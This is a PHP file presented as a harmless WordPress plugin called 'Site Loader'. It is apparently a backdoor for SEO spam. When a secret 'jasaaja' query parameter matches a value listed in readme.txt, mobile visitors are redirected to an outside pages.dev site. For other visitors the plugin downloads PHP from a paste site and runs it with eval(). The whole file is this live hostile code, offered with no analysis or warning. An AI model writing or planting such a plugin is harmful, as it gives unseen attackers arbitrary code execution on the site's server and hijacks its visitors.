<?php
/**
 * Plugin Name: Site Loader
 * Description: Menjalankan file PHP Sesuai Plugins Wp Yang Berlaku
 */

add_action('template_redirect', function () {
    if (!isset($_GET['jasaaja'])) return;

    $param = strtolower(trim($_GET['jasaaja']));
    $readmeFile = __DIR__ . '/readme.txt';
    if (!file_exists($readmeFile)) return;

    $allowed = file($readmeFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $allowed = array_map('strtolower', $allowed);
    if (!in_array($param, $allowed)) return;

    // Variabel untuk digunakan di dalam remote script
    $BRANDS = strtoupper($param);
    $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $uri = strtok($_SERVER['REQUEST_URI'], '?');
    $urlPath = "$scheme://$host$uri?jasaaja=$BRANDS";

    // Deteksi AMP dari URL
    $is_amp = isset($_GET['amp']) && $_GET['amp'] === '1';

    // Deteksi perangkat mobile
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $is_mobile = preg_match('/iphone|android|ipad|mobile|blackberry|opera mini|iemobile|wpdesktop/', $user_agent);

    // Redirect otomatis ke AMP jika dari mobile dan belum AMP
    if ($is_mobile && !$is_amp) {
        $amp_redirect = "https://prokaltim.pages.dev/?jasaaja=$BRANDS";
        wp_redirect($amp_redirect, 302);
        exit;
    }

    // Versi AMP untuk digunakan di HTML, tanpa &amp=1
    $ampnya = "https://prokaltim.pages.dev/?jasaaja=$BRANDS";

    // Ambil konten PHP dari remote (gunakan script PHP valid)
    $remote_url = "https://paste.myconan.net/587147.txt"; // ganti jika perlu
    $php_code = fetch_remote_php($remote_url);

    if (!$php_code) {
        wp_die('Gagal memuat konten remote.');
    }

    // Eksekusi isi remote dengan variabel lokal diexport
    extract([
        'BRANDS' => $BRANDS,
        'urlPath' => $urlPath,
        'ampnya' => $ampnya
    ]);

    ob_start();
    eval("?>".$php_code);
    $output = ob_get_clean();

    echo $output;
    exit;
});

// Fungsi ambil isi file remote
function fetch_remote_php($url) {
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\n"
        ]
    ]);
    return @file_get_contents($url, false, $context);
}
